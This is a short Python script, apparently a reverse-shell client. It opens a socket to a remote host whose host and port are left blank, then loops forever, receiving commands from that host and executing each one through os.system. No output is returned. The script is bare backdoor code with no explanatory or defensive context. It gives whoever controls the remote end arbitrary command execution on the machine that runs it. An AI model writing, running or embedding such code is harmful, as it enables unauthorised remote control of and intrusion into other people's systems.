import socket
import sys
import os
host = ''
port = ''




def client_socket():
  s = socket.socket()
  try:
    s.connect((host, port))
  except:
    print("Unable To Connect To", host, 'using port', port)
    sys.exit()
  shell(s)

def shell(s):
  while True:
    cmd = s.recv(1024).decode('utf8')
    os.system(cmd)
